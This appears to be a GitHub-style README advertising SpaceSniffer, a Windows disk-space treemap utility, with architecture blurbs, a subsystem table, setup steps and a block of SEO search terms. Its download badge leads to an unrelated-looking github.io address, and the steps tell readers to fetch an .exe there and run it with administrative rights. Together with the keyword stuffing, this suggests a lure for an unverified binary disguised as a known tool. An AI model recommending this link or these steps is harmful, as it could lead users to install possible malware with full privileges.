## [01] SYSTEM_MANIFEST & SCOPE

SpaceSniffer is a portable, high-performance disk space analysis engine engineered for instant visualization of storage distribution on modern Windows environments. Utilizing a dynamic Treemap visualization layout, it translates complex directory structures into intuitive visual blocks, allowing system engineers and administrators to immediately locate large files, hidden folder bloat, and unorganized storage clusters.

[![Download SpaceSniffer](https://img.shields.io/badge/Download-SpaceSniffer-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ivunevcdc.github.io/.github/SpaceSniffer-Storage-Core)

SpaceSniffer performs live file system monitoring, dynamically updating its visual canvas as files are created, modified, or deleted. Featuring advanced filtering syntax, direct Shell context menu integration, and zero external software dependencies, it serves as an essential utility for storage cleanup and drive capacity auditing.

---

## [02] LOW_LEVEL_ARCHITECTURE

* **[TREEMAP_LAYOUT_ENGINE]** : Computes block proportions using adaptive squarified treemap algorithms to reflect exact byte usage across logical storage volumes.
* **[DIRECTORY_INDEX_SCANNER]** : Executes multi-threaded drive traversal, utilizing low-level Windows API file handle enumeration for rapid volume indexing.
* **[FILE_MONITOR_SUBSYSTEM]** : Registers background file system change notifications to update the visual layout in real time when disk contents change.
* **[FILTER_SYNTAX_PARSER]** : Evaluates custom search queries (e.g., file age, size boundaries, extension masks) to highlight targeted file subsets dynamically.
* **[SHELL_INTEGRATION_HOOK]** : Connects visual canvas elements directly to the Windows File Explorer context menu for immediate file deletion, inspection, or opening.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDhqYZqFxO77DJuWRYVQWHyLN2tooPkSMaOjpzzkNNtqTvSqyIuWTXVPY&s=10" alt="Program Interface Screenshot"/>

---

## [03] PARAMETRIC_SUBSYSTEM_MATRIX

| SUBSYSTEM_ID | INTERFACE_TECH | OPERATIONAL_BEHAVIOR |
| :--- | :--- | :--- |
| **CANVAS_RENDER** | Win32 GDI / Custom Draw | Renders proportional interactive treemap boxes representing files and subdirectories. |
| **VOL_SCANNER** | Win32 FindFirstFile API | Traverses MFT entries and local folder paths to build low-overhead directory maps. |
| **FILTER_CORE** | Logical Query Processor | Applies rules based on file size, extension, and creation date to filter visible canvas blocks. |
| **LIVE_WATCH** | ReadDirectoryChangesW | Intercepts I/O events to dynamically resize canvas elements without rescanning whole drives. |
| **EXPORT_NODE** | Structured Text Engine | Exports directory layout hierarchies into plain text or structured log files for storage audits. |

---

## [04] DEPLOYMENT_AND_EXECUTION_PROTOCOL

1. **System Provisioning:**
   Ensure target machine runs Windows NT operating environment with local read permissions across target drives.

2. **Binary Acquisition:**
   Download the portable `SpaceSniffer.exe` archive package from the official release endpoint.

3. **Execution Setup:**
   Extract the archive to a local folder or portable administrator workspace without running an installer routine.

4. **Storage Audit Execution:**
   Launch `SpaceSniffer.exe` with administrative rights to enable access to system volumes, select the target drive, and initiate the visual scan sequence.

---

### SEARCH TERMS
SpaceSniffer Windows • disk space analyzer • treemap storage visualizer • hard drive space usage • folder size visualizer • storage cleanup utility • portable disk analyzer • real time file scanner • drive capacity auditor • visual directory map • disk bloat finder • file size filter tool • large file finder • Windows storage manager • disk layout inspector
